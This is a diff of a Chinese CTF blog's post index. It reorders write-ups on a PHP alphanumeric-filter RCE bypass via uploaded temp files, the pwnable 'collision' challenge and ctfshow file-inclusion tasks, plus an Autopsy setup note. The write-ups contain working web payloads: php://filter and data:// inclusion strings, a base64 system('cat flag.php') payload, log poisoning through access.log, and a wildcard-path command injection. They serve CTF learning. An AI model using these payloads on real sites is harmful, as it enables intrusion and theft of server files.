-<p>并且进行抓包处理，通过cmd进行文件调用，然后在内容中进行命令执行（概率事件，因为占位符匹配时不一定第一时间就能匹配到该文件）</p>
-<img src="/2022/09/21/RCE%E4%B8%AD%E7%9A%84%E4%B8%80%E4%B8%AA%E5%A7%BF%E5%8A%BF%E7%BB%95%E8%BF%87%E8%BF%87%E6%BB%A4%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97/image-20220907154234433.png" class="" title="image-20220907154234433">
-]]></content>
-      <categories>
-        <category>笔记</category>
-        <category>web笔记</category>
-      </categories>
-      <tags>
-        <tag>web</tag>
       </tags>
   </entry>
   <entry>
@@ -1424,31 +1394,33 @@
       </tags>
   </entry>
   <entry>
-    <title>Sleuth Kit、Autopsy 的使用</title>
-    <url>/2022/06/19/Sleuth%20Kit%E3%80%81Autopsy%20%E7%9A%84%E4%BD%BF%E7%94%A8/</url>
-    <content><![CDATA[<p>这是picoctf中涉及到的一个工具，配置的教程网上有，这里记录一下我在过程当中遇到的问题</p>
-<p>这是教程网站：</p>
-<p><a href="https://linux.cn/article-5541-1.html">https://linux.cn/article-5541-1.html</a></p>
-<p>因为不懂，所以尽管跟着教程走也走了不少的弯路，这里建议大家跟着教程走，所以Autopsy 的版本最好和教程一样。这是下载Autopsy 2.24源码的网址：</p>
-<p><a href="https://sourceforge.net/projects/autopsy/files/autopsy/2.24/">https://sourceforge.net/projects/autopsy/files/autopsy/2.24/</a></p>
-<p>也可以跟着官网去配置最新版本（<a href="http://www.sleuthkit.org/sleuthkit/">http://www.sleuthkit.org/sleuthkit/</a> 这是官网，Autopsy 也可以在里面找到），那个稍微有些麻烦，可能会有不断地报错，但如果对linux命令熟悉且精通的话，那大可以忽略我的话。</p>
-<p>这里就说说2.24版本，首先我们需要用root权限保持Autopsy 的后台开启着，不然他就会报错（记住要用root权限）</p>
-<img src="/2022/06/19/Sleuth%20Kit%E3%80%81Autopsy%20%E7%9A%84%E4%BD%BF%E7%94%A8/wps4.jpg" class="" title="img"> 
+    <title>RCE中的一个姿势绕过过滤字母数字</title>
+    <url>/2022/09/21/RCE%E4%B8%AD%E7%9A%84%E4%B8%80%E4%B8%AA%E5%A7%BF%E5%8A%BF%E7%BB%95%E8%BF%87%E8%BF%87%E6%BB%A4%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97/</url>
+    <content><![CDATA[<p>全局变量的应有（$FILE）</p>
+<p>简单的说明一下$_FILE全局变量：$_FILE存放了我们上传文件信息，包含文件的名字，文件的大小，文件的类型，文件是否网络传输错误、文件内容。故当上传一个php脚本会被存储于$_FILE中</p>
+<p>（存储的临时路径为&#x2F;tmp&#x2F;php?????? 前三位为php）</p>
+<p>利用.或sh进行连接</p>
+<p>因为字母被过滤了所以上传时使用payload:</p>
+<p> .%20&#x2F;???&#x2F;?????????</p>
+<p>.%20&#x2F;???&#x2F;????????[@-[]   #若最后一个字符为大写可以使用</p>
+<h1 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$cmd</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-z]|[0-9]/i&quot;</span>,<span class="variable">$cmd</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="variable">$cmd</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
-<p>这是报错情况</p>
-<img src="/2022/06/19/Sleuth%20Kit%E3%80%81Autopsy%20%E7%9A%84%E4%BD%BF%E7%94%A8/wps5.jpg" class="" title="img"> 
 
-<p>这样就可以了，根据链接打开工具</p>
-<img src="/2022/06/19/Sleuth%20Kit%E3%80%81Autopsy%20%E7%9A%84%E4%BD%BF%E7%94%A8/wps6.jpg" class="" title="img"> 
 
-<p>接下来可以New Case 跟着上面的教程走，中间如果出现了没有发现下一步的按钮时，建议试一下重启虚拟机，重新来一遍。在里面你可以选择查看整个磁盘，也可以查看磁盘的一个分区。总之，多用用就行了。在下载的过程中如果遇到了报错，可以根据报错去寻找解决的方案。最重要的是找到自己可以配置成功的版本，启动并使用工具。</p>
+<h1 id="上传的html文件"><a href="#上传的html文件" class="headerlink" title="上传的html文件"></a>上传的html文件</h1><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span> <span class="attr">action</span>=<span class="string">&quot;题目网址/?cmd=. /???/????????[@-[]&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;upload&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>进入上传文件页面</p>
+<img src="/2022/09/21/RCE%E4%B8%AD%E7%9A%84%E4%B8%80%E4%B8%AA%E5%A7%BF%E5%8A%BF%E7%BB%95%E8%BF%87%E8%BF%87%E6%BB%A4%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97/image-20220907154820829.png" class="" title="image-20220907154820829">
+
+<p>并且进行抓包处理，通过cmd进行文件调用，然后在内容中进行命令执行（概率事件，因为占位符匹配时不一定第一时间就能匹配到该文件）</p>
+<img src="/2022/09/21/RCE%E4%B8%AD%E7%9A%84%E4%B8%80%E4%B8%AA%E5%A7%BF%E5%8A%BF%E7%BB%95%E8%BF%87%E8%BF%87%E6%BB%A4%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97/image-20220907154234433.png" class="" title="image-20220907154234433">
 ]]></content>
       <categories>
         <category>笔记</category>
-        <category>misc笔记</category>
+        <category>web笔记</category>
       </categories>
       <tags>
-        <tag>misc</tag>
+        <tag>web</tag>
       </tags>
   </entry>
   <entry>
@@ -1542,6 +1514,34 @@
       </categories>
       <tags>
         <tag>pwn</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Sleuth Kit、Autopsy 的使用</title>
+    <url>/2022/06/19/Sleuth%20Kit%E3%80%81Autopsy%20%E7%9A%84%E4%BD%BF%E7%94%A8/</url>
+    <content><![CDATA[<p>这是picoctf中涉及到的一个工具，配置的教程网上有，这里记录一下我在过程当中遇到的问题</p>
+<p>这是教程网站：</p>
+<p><a href="https://linux.cn/article-5541-1.html">https://linux.cn/article-5541-1.html</a></p>
+<p>因为不懂，所以尽管跟着教程走也走了不少的弯路，这里建议大家跟着教程走，所以Autopsy 的版本最好和教程一样。这是下载Autopsy 2.24源码的网址：</p>
+<p><a href="https://sourceforge.net/projects/autopsy/files/autopsy/2.24/">https://sourceforge.net/projects/autopsy/files/autopsy/2.24/</a></p>
+<p>也可以跟着官网去配置最新版本（<a href="http://www.sleuthkit.org/sleuthkit/">http://www.sleuthkit.org/sleuthkit/</a> 这是官网，Autopsy 也可以在里面找到），那个稍微有些麻烦，可能会有不断地报错，但如果对linux命令熟悉且精通的话，那大可以忽略我的话。</p>
+<p>这里就说说2.24版本，首先我们需要用root权限保持Autopsy 的后台开启着，不然他就会报错（记住要用root权限）</p>
+<img src="/2022/06/19/Sleuth%20Kit%E3%80%81Autopsy%20%E7%9A%84%E4%BD%BF%E7%94%A8/wps4.jpg" class="" title="img"> 
+
+<p>这是报错情况</p>
+<img src="/2022/06/19/Sleuth%20Kit%E3%80%81Autopsy%20%E7%9A%84%E4%BD%BF%E7%94%A8/wps5.jpg" class="" title="img"> 
+
+<p>这样就可以了，根据链接打开工具</p>
+<img src="/2022/06/19/Sleuth%20Kit%E3%80%81Autopsy%20%E7%9A%84%E4%BD%BF%E7%94%A8/wps6.jpg" class="" title="img"> 
+
+<p>接下来可以New Case 跟着上面的教程走，中间如果出现了没有发现下一步的按钮时，建议试一下重启虚拟机，重新来一遍。在里面你可以选择查看整个磁盘，也可以查看磁盘的一个分区。总之，多用用就行了。在下载的过程中如果遇到了报错，可以根据报错去寻找解决的方案。最重要的是找到自己可以配置成功的版本，启动并使用工具。</p>
+]]></content>
+      <categories>
+        <category>笔记</category>
+        <category>misc笔记</category>
+      </categories>
+      <tags>
+        <tag>misc</tag>
       </tags>
   </entry>
   <entry>
@@ -1875,6 +1875,29 @@
       </tags>
   </entry>
   <entry>
+    <title>collision</title>
+    <url>/2022/07/12/collision(wp)/</url>
+    <content><![CDATA[<h1 id="题目简介"><a href="#题目简介" class="headerlink" title="题目简介"></a>题目简介</h1><p>一个简单的加密函数逆向的题目</p>
+<h1 id="解题流程"><a href="#解题流程" class="headerlink" title="解题流程"></a>解题流程</h1><h2 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> hashcode = <span class="number">0x21DD09EC</span>;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> <span class="title function_">check_password</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* p)</span>&#123;</span><br><span class="line">        <span class="type">int</span>* ip = (<span class="type">int</span>*)p;		<span class="comment">//一个int型占4字节，所以类型转换后20字节的字符被分成了5个int型数字</span></span><br><span class="line">        <span class="type">int</span> i;</span><br><span class="line">        <span class="type">int</span> res=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;<span class="number">5</span>; i++)&#123;</span><br><span class="line">                res += ip[i];	<span class="comment">//刚好循环5次，将5个数字累加起来</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;		</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(argc&lt;<span class="number">2</span>)&#123;		<span class="comment">//运行程序时需要传入一个外部参数</span></span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;usage : %s [passcode]\n&quot;</span>, argv[<span class="number">0</span>]);	</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">strlen</span>(argv[<span class="number">1</span>]) != <span class="number">20</span>)&#123;		<span class="comment">//该外部参数长度必须等于20字节</span></span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;passcode length should be 20 bytes\n&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(hashcode == check_password( argv[<span class="number">1</span>] ))&#123;		<span class="comment">//如果外部参数的值等于hashcode则打印flag</span></span><br><span class="line">                system(<span class="string">&quot;/bin/cat flag&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;wrong passcode.\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>通过分析上诉代码可以知道我们只要输入5个数字，并控制他们的和等于<code>0x21DD09EC</code>即可。</p>
+<h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p>因为<code>0x21DD09EC</code>不能被5整除，所以加一整除后再从某个数据中减一即可。</p>
+<p>所以我们要输入的5个数字的值为：<strong>0x6C5CEC9、0x6C5CEC9、0x6C5CEC9、0x6C5CEC9、0x6C5CEC8</strong></p>
+<p>这里我们需要将16进制数转码为字符，4字节一组，表示一个16进制数，注意是小端序，所以要逆序写：</p>
+<p><strong>\xc9\xce\xc5\x06\xc9\xce\xc5\x06\xc9\xce\xc5\x06\xc9\xce\xc5\x06\xc8\xce\xc5\x06</strong></p>
+<p>最后借助python将这些字符作为参数传进去。</p>
+<h1 id="shell指令"><a href="#shell指令" class="headerlink" title="shell指令"></a>shell指令</h1><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">./col `python -c &#x27;print &quot;\xc9\xce\xc5\x06\xc9\xce\xc5\x06\xc9\xce\xc5\x06\xc9\xce\xc5\x06\xc8\xce\xc5\x06</span><br><span class="line">&quot;&#x27;`</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>刷题</category>
+        <category>pwnable刷题</category>
+      </categories>
+      <tags>
+        <tag>pwn</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>CC链</title>
     <url>/2023/06/05/cc%E9%93%BE/</url>
     <content><![CDATA[<h1 id="cc6"><a href="#cc6" class="headerlink" title="cc6"></a>cc6</h1><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">HashMap------------------readObject()</span><br><span class="line">	TiedMapEntry------------------hashCode()</span><br><span class="line">		LazyMap------------------get()</span><br><span class="line">			InvokerTransformer------------------transform()</span><br></pre></td></tr></table></figure>
@@ -2106,26 +2129,76 @@
       </tags>
   </entry>
   <entry>
-    <title>collision</title>
-    <url>/2022/07/12/collision(wp)/</url>
-    <content><![CDATA[<h1 id="题目简介"><a href="#题目简介" class="headerlink" title="题目简介"></a>题目简介</h1><p>一个简单的加密函数逆向的题目</p>
-<h1 id="解题流程"><a href="#解题流程" class="headerlink" title="解题流程"></a>解题流程</h1><h2 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> hashcode = <span class="number">0x21DD09EC</span>;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> <span class="title function_">check_password</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* p)</span>&#123;</span><br><span class="line">        <span class="type">int</span>* ip = (<span class="type">int</span>*)p;		<span class="comment">//一个int型占4字节，所以类型转换后20字节的字符被分成了5个int型数字</span></span><br><span class="line">        <span class="type">int</span> i;</span><br><span class="line">        <span class="type">int</span> res=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;<span class="number">5</span>; i++)&#123;</span><br><span class="line">                res += ip[i];	<span class="comment">//刚好循环5次，将5个数字累加起来</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;		</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(argc&lt;<span class="number">2</span>)&#123;		<span class="comment">//运行程序时需要传入一个外部参数</span></span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;usage : %s [passcode]\n&quot;</span>, argv[<span class="number">0</span>]);	</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">strlen</span>(argv[<span class="number">1</span>]) != <span class="number">20</span>)&#123;		<span class="comment">//该外部参数长度必须等于20字节</span></span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;passcode length should be 20 bytes\n&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(hashcode == check_password( argv[<span class="number">1</span>] ))&#123;		<span class="comment">//如果外部参数的值等于hashcode则打印flag</span></span><br><span class="line">                system(<span class="string">&quot;/bin/cat flag&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;wrong passcode.\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+    <title>文件包含入门（web78~web81）</title>
+    <url>/2022/07/25/ctfshow_web78~web81/</url>
+    <content><![CDATA[<h1 id="ctfshow（web78-web81）-文件包含入门"><a href="#ctfshow（web78-web81）-文件包含入门" class="headerlink" title="ctfshow（web78~web81） 文件包含入门"></a>ctfshow（web78~web81） 文件包含入门</h1><h2 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h2><p>​             在这些题中用到了许多php伪协议，这里写两个做题中比较常用的，具体请看博客（<a href="https://blog.csdn.net/qq_53142368/article/details/116594299">(21条消息) PHP伪协议_H0ne的博客-CSDN博客_php伪协议</a>）</p>
+<p>1、php伪协议：data:&#x2F;&#x2F;碰到file_get_contents()，include（）来用；</p>
+<p><strong>个人感觉data比较万能所以再没有头绪的时候可以尝试一下；</strong></p>
+<p>2、php:&#x2F;&#x2F;input （读取POST数据）</p>
+<p>碰到file_get_contents()就要想到用php:&#x2F;&#x2F;input绕过，因为php伪协议也是可以利用http协议的，即可以使用POST方式传数据，具体函数意义下一项；</p>
+<p>3、php:&#x2F;&#x2F;filter（本地磁盘文件进行读取）（filter:&#x2F;&#x2F; 感觉是遇到include()函数使用）</p>
+<p>元封装器，设计用于”数据流打开”时的”筛选过滤”应用，对本地磁盘文件进行读写。</p>
+<ul>
+<li><h2 id="web78"><a href="#web78" class="headerlink" title="web78"></a>web78</h2></li>
+</ul>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<p>通过分析上诉代码可以知道我们只要输入5个数字，并控制他们的和等于<code>0x21DD09EC</code>即可。</p>
-<h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p>因为<code>0x21DD09EC</code>不能被5整除，所以加一整除后再从某个数据中减一即可。</p>
-<p>所以我们要输入的5个数字的值为：<strong>0x6C5CEC9、0x6C5CEC9、0x6C5CEC9、0x6C5CEC9、0x6C5CEC8</strong></p>
-<p>这里我们需要将16进制数转码为字符，4字节一组，表示一个16进制数，注意是小端序，所以要逆序写：</p>
-<p><strong>\xc9\xce\xc5\x06\xc9\xce\xc5\x06\xc9\xce\xc5\x06\xc9\xce\xc5\x06\xc8\xce\xc5\x06</strong></p>
-<p>最后借助python将这些字符作为参数传进去。</p>
-<h1 id="shell指令"><a href="#shell指令" class="headerlink" title="shell指令"></a>shell指令</h1><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">./col `python -c &#x27;print &quot;\xc9\xce\xc5\x06\xc9\xce\xc5\x06\xc9\xce\xc5\x06\xc9\xce\xc5\x06\xc8\xce\xc5\x06</span><br><span class="line">&quot;&#x27;`</span><br></pre></td></tr></table></figure>
+<p>payload:?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php</p>
+<p>传输后获得一串base64加密过后的编码。解密即可；</p>
+<ul>
+<li><h2 id="web79"><a href="#web79" class="headerlink" title="web79"></a>web79</h2></li>
+</ul>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这题对输入进行了一定的过滤，即不能包含的url中不能直接出现php，可以使用data协议，进行base64加密即可</p>
+<p>​			payload:</p>
+<p>file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs&#x3D;</p>
+<p>之后再查看器中进行查看；</p>
+<img src="/2022/07/25/ctfshow_web78~web81/image-20220724155731962.png" class="" title="image-20220724155731962">
+
+
+
+<ul>
+<li><h2 id="web80-81"><a href="#web80-81" class="headerlink" title="web80-81"></a>web80-81</h2></li>
+</ul>
+<p>循序渐进将data协议也禁止了，所以我们可以使用包含日志文件来获取flag</p>
+<p>（我们可以通过响应头获取有关中间件的信息，以此判断日志文件的路径）</p>
+<p><em><strong>tips:</strong></em></p>
+<p><strong>nginx日志在&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log</strong></p>
+<p><strong>apache日志在类似目录下&#x2F;var&#x2F;log&#x2F;httpd&#x2F;access.log</strong></p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//web80题目</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"> <span class="comment">//没有对输入进行限制和处理所以此处我们可以通过大小写绕过；</span></span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>payload:?file&#x3D;&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log</p>
+<p>传输后发现日志中记载的是UA头，所以可以通过bp再UA头中构造语句获得flag</p>
+<img src="/2022/07/25/ctfshow_web78~web81/image-20220724161603151.png" class="" title="image-20220724161603151">
+
+<p>先查看文件</p>
+<img src="/2022/07/25/ctfshow_web78~web81/image-20220724163900808.png" class="" title="image-20220724163900808">
+
+<p>获取flag（至于这里为甚么用base64有点不明白，猜测：可能文件使用的是base64加密吧，不过使用vi和vim也可以获得flag）</p>
+<img src="/2022/07/25/ctfshow_web78~web81/image-20220724164056572.png" class="" title="image-20220724164056572">
+
+<img src="/2022/07/25/ctfshow_web78~web81/image-20220724164233173.png" class="" title="image-20220724164233173">
+
+<p>（两道题都可以使用这种日志包含的思路web81的具体过程就不在此具体赘述）</p>
+<h2 id="web80的第二种解法（php：-x2F-x2F-input）"><a href="#web80的第二种解法（php：-x2F-x2F-input）" class="headerlink" title="web80的第二种解法（php：&#x2F;&#x2F;input）"></a>web80的第二种解法（php：&#x2F;&#x2F;input）</h2><p>正如代码中注释所说我们可以利用大小写绕过后使用input协议，通过post传值进行命令执行</p>
+<img src="/2022/07/25/ctfshow_web78~web81/image-20220725202045975.png" class="" title="image-20220725202045975">
+
+
+
+
+
+
+
+
 
 ]]></content>
       <categories>
         <category>刷题</category>
-        <category>pwnable刷题</category>
+        <category>ctfshow刷题</category>
       </categories>
       <tags>
-        <tag>pwn</tag>
+        <tag>web</tag>
       </tags>
   </entry>
   <entry>
@@ -2201,79 +2274,6 @@
         <category>刷题</category>
         <category>笔记</category>
         <category>web笔记</category>
-        <category>ctfshow刷题</category>
-      </categories>
-      <tags>
-        <tag>web</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>文件包含入门（web78~web81）</title>
-    <url>/2022/07/25/ctfshow_web78~web81/</url>
-    <content><![CDATA[<h1 id="ctfshow（web78-web81）-文件包含入门"><a href="#ctfshow（web78-web81）-文件包含入门" class="headerlink" title="ctfshow（web78~web81） 文件包含入门"></a>ctfshow（web78~web81） 文件包含入门</h1><h2 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h2><p>​             在这些题中用到了许多php伪协议，这里写两个做题中比较常用的，具体请看博客（<a href="https://blog.csdn.net/qq_53142368/article/details/116594299">(21条消息) PHP伪协议_H0ne的博客-CSDN博客_php伪协议</a>）</p>
-<p>1、php伪协议：data:&#x2F;&#x2F;碰到file_get_contents()，include（）来用；</p>
-<p><strong>个人感觉data比较万能所以再没有头绪的时候可以尝试一下；</strong></p>
-<p>2、php:&#x2F;&#x2F;input （读取POST数据）</p>
-<p>碰到file_get_contents()就要想到用php:&#x2F;&#x2F;input绕过，因为php伪协议也是可以利用http协议的，即可以使用POST方式传数据，具体函数意义下一项；</p>
-<p>3、php:&#x2F;&#x2F;filter（本地磁盘文件进行读取）（filter:&#x2F;&#x2F; 感觉是遇到include()函数使用）</p>
-<p>元封装器，设计用于”数据流打开”时的”筛选过滤”应用，对本地磁盘文件进行读写。</p>
-<ul>
-<li><h2 id="web78"><a href="#web78" class="headerlink" title="web78"></a>web78</h2></li>
-</ul>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>payload:?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php</p>
-<p>传输后获得一串base64加密过后的编码。解密即可；</p>
-<ul>
-<li><h2 id="web79"><a href="#web79" class="headerlink" title="web79"></a>web79</h2></li>
-</ul>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>这题对输入进行了一定的过滤，即不能包含的url中不能直接出现php，可以使用data协议，进行base64加密即可</p>
-<p>​			payload:</p>
-<p>file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs&#x3D;</p>
-<p>之后再查看器中进行查看；</p>
-<img src="/2022/07/25/ctfshow_web78~web81/image-20220724155731962.png" class="" title="image-20220724155731962">
-
-
-
-<ul>
-<li><h2 id="web80-81"><a href="#web80-81" class="headerlink" title="web80-81"></a>web80-81</h2></li>
-</ul>
-<p>循序渐进将data协议也禁止了，所以我们可以使用包含日志文件来获取flag</p>
-<p>（我们可以通过响应头获取有关中间件的信息，以此判断日志文件的路径）</p>
-<p><em><strong>tips:</strong></em></p>
-<p><strong>nginx日志在&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log</strong></p>
-<p><strong>apache日志在类似目录下&#x2F;var&#x2F;log&#x2F;httpd&#x2F;access.log</strong></p>
